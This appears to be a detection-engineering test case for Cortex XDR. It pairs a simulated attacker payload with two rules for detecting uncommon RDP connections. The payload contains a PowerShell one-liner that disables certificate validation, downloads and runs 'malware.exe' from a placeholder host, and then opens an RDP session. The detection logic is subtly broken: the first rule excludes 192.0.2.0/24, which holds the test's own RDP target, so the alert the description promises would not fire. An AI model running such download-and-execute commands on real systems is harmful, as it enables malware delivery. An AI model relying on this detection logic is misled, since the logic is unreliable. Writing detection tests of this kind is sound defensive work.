identity.summary: An attacker initiates an RDP connection to a Windows host using mstsc.exe, which triggers an 'Uncommon RDP connection' alert due to the unusual destination IP. Cortex should detect the process executi
identity.description: An attacker initiates an RDP connection to a Windows host using mstsc.exe, which triggers an 'Uncommon RDP connection' alert due to the unusual destination IP. Cortex should detect the process execution and network connection.

techniques.name: Command and Scripting Interpreter: Windows Command Shell

payload.code:
cd C:\Windows\Temp
mkdir test_dir
powershell -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\Windows\Temp\malware.exe')"
C:\Windows\Temp\malware.exe
mstsc.exe /v:192.0.2.50

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon RDP Connection
biocs.description: Detection of RDP connection to an IP not typically seen in the environment
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_process_image_name = 'mstsc.exe'
| filter dst_port = 3389
| filter action_remote_ip != '192.0.2.0/24'
| filter action_remote_ip != '10.0.0.0/8'
| filter action_remote_ip != '172.16.0.0/12'
| filter action_remote_ip != '127.0.0.0/8'
| filter action_remote_ip != '169.254.0.0/16'

abiocs.name: RDP Connection From Unknown Host
abiocs.description: RDP connection initiated from a host that does not typically make such connections
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_process_image_name = 'mstsc.exe'
| filter dst_port = 3389
| filter causality_actor_process_image_name != 'explorer.exe'
| filter causality_actor_process_image_name != 'svchost.exe'
